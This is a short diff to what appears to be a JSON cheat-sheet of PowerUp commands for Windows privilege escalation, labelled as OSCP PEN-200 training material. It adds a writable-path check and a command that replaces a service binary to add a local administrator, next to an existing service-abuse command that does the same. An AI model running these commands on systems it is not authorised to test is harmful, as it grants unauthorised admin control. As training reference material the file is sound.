@@ -100,6 +100,14 @@
     {
       "label": "PowerUp auto-abuse",
       "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'"
+    },
+    {
+      "label": "PowerUp writable-path check (OSCP PEN-200 Ch16)",
+      "command": "Get-ModifiablePath -Path <service_binary_or_dir>   # PowerUp: test if current user can write the path"
+    },
+    {
+      "label": "PowerUp binary replace (OSCP PEN-200 Ch16)",
+      "command": "Install-ServiceBinary -Name '<service>'   # PowerUp: swap the service binary for one that adds a local admin"
     }
   ],
   "steps": [
